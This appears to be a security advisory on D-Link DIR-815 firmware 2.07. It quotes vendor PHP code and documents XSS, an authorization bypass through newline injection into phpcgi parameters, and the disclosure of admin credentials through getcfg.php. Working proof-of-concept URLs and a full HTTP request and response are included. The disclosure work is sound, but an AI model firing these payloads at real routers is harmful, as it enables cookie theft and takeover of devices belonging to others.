### Production Description

- Product Page : DIR-815
- Firmware Version : 2.07 (DIR-815_REVB_FIRMWARE_PATCH_2.07.B01) 
- Hardware Version : N/A

### Vulnerabilities Summary

There are several vulnerabilities :

1. **Xss**
2. **Permission bypass** 
3. **Information disclosure**.

### Details - WAN && LAN - revB - XSS

An attacker can use the XSS to target which is an authenticated user in order to steal the authentication cookies.

1. /htdocs/webinc/js/bsc_sms_inbox.php   line: 17

   ```php
   [..]
   var get_Treturn = '<?if($_GET["Treturn"]=="") echo "0"; else echo $_GET["Treturn"];?>';
   [..]
   ```

   The parameter  **$_GET["Treturn"]** has no filter.So the poc:

   ```http://192.168.0.1/bsc_sms_inbox.php?Treturn=1';alert(document.cookie)//```

2. /htdocs/webinc/js/info.php line:27 -30

   ```php
   [..]
   		$title	= "ACTION ".$_GET["RESULT"];
   		if($_GET["REASON"]=="ERR_REQ_TOO_LONG")
   		{
   			$message = "'".i18n("The action requested failed because the file uploaded too large.")."', "."'<a href=\"".$referer."\">".i18n("Click here to return to the previous page.")."</a>'";
   		}
   		echo "\t\tvar msgArray = [".$message."];\n";
   		echo "\t\tBODY.ShowMessage(\"".$title."\", msgArray);\n";
   ?>  },
   [..]
   ```

   The parameter  **$_GET["RESULT"]** has the same problem as the last one,So the poc:

   ```http://192.168.0.1/info.php?RESULT=",msgArray);alert(document.cookie);//```

### Details - WAN && LAN - revB - Permission bypass&Information disclosure

1. **Permission bypass**

   I found some files or some functions only can be accessed by power user,such like:

   /htdocs/web/getcfg.php  line:83-94

   ```php
   function is_power_user()
   {
   	if($_GLOBALS["AUTHORIZED_GROUP"] == "")
   	{
   		return 0;
   	}
   	if($_GLOBALS["AUTHORIZED_GROUP"] < 0)
   	{
   		return 0;
   	}
   	return 1;
   }
   ```

   We can see the ```$_GLOBALS["AUTHORIZED_GROUP"]``` need to be greater than 0 and not a null.

   Phpcgi is a symbolic link to cgibin. Phpcgi is responsible for processing requests to .php, .asp and .txt pagesIt can be through URL, HTTP head or POST request sent by body data analysis.The phpcgi will create a long string, and the string will be treated as a series of key value pairs, and are used in ```$_GET, $_POST and $_SERVER``` dictionary and PHP script variable.Nevertheless, if a request is crafted in a proper way, an attacker can easily bypass authorization.

   Each of the key values pairs is encoded in the following form: _TYPE_KEY = VALUE, where TYPE can be GET, POST, or SERVER. Next, the key value pairs are connected using the branch character '\n'. In this way, we can build a packet by itself to bypass some permission validation.Such like this:

   ```xxx=%0a_POST_AUTHORIZED_GROUP%3d1```

2. **Information disclosure**

   /htdocs/web/getcfg.php  line:94-147

   ```php
   if ($_POST["CACHE"] == "true")
   {
   	echo dump(1, "/runtime/session/".$SESSION_UID."/postxml");
   }
   else
   {
   	if(is_power_user() == 1)
   	{
   		/* cut_count() will return 0 when no or only one token. */
   		$SERVICE_COUNT = cut_count($_POST["SERVICES"], ",");
   		TRACE_debug("GETCFG: got ".$SERVICE_COUNT." service(s): ".$_POST["SERVICES"]);
   		$SERVICE_INDEX = 0;
   		while ($SERVICE_INDEX < $SERVICE_COUNT)
   		{
   			$GETCFG_SVC = cut($_POST["SERVICES"], $SERVICE_INDEX, ",");
   			TRACE_debug("GETCFG: serivce[".$SERVICE_INDEX."] = ".$GETCFG_SVC);
   			if ($GETCFG_SVC!="")
   			{
   				$file = "/htdocs/webinc/getcfg/".$GETCFG_SVC.".xml.php";
   				/* GETCFG_SVC will be passed to the child process. */
   				if (isfile($file)=="1")
   				{
   					if(get("", "/runtime/device/sessions_privatekey")==1)
   					{
   						AES_Encrypt_DBnode($GETCFG_SVC, "Encrypt");
   						dophp("load", $file);
   						AES_Encrypt_DBnode($GETCFG_SVC, "Decrypt");
   					}
   					else
   					{	dophp("load", $file);}
   				}
   			}
   			$SERVICE_INDEX++;
   		}
   	}
   	else
   	{
   		/* not a power user, return error message */
   		echo "\t<result>FAILED</result>\n";
   		echo "\t<message>Not authorized</message>\n";
   	}
   }
   ```

   We can see ```dophp("load", $file)```, the function like a ``include()`` .

   The  variable **$file ** is made up of  **$GETCFG_SVC**, then **$GETCFG_SVC** comes from ```$_POST["SERVICES"]```, there is also no filter,so we can control the variable **$file **, and the permission validation ```is_power_user()```  can be bypassed by last trick. In this way,we can include any other php scripts to get some important informations,such like **DEVICE.ACCOUNT.xml.php**, it returns a username and password to a router,then we can login in the router.

3. **Proof of concept:**

   The http request:

   ```http
   GET /getcfg.php?a=%0a_POST_SERVICES%3DDEVICE.ACCOUNT%0aAUTHORIZED_GROUP%3D1 HTTP/1.1
   Host: 192.168.0.1
   User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:50.0) Gecko/20100101 Firefox/50.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
   Accept-Language: en-US,en;q=0.5
   Connection: close
   Upgrade-Insecure-Requests: 1
   ```

   the response:

   ```http
   HTTP/1.1 200 OK
   Server: Linux, HTTP/1.1, DIR-815 Ver 2.07
   Date: Sat, 01 Jan 2000 09:32:01 GMT
   Connection: close
   Content-Type: text/xml
   Content-Length: 646

   <?xml version="1.0" encoding="utf-8"?>
   <postxml>
   <module>
   	<service>DEVICE.ACCOUNT</service>
   	<device>
   		<gw_name>DIR-815</gw_name>
   		<account>
   			<seqno></seqno>
   			<max>1</max>
   			<count>1</count>
   			<entry>
   				<uid></uid>
   				<name>Admin</name>
   				<usrid></usrid>
   				<password></password>
   				<group>0</group>
   				<description></description>
   			</entry>
   		</account>
   		<group>
   			<seqno></seqno>
   			<max></max>
   			<count>0</count>
   		</group>
   		<session>
   			<captcha>0</captcha>
   			<dummy></dummy>
   			<timeout>180</timeout>
   			<maxsession>128</maxsession>
   			<maxauthorized>16</maxauthorized>
   		</session>
   	</device>
   </module>
   </postxml>
   ```

   ​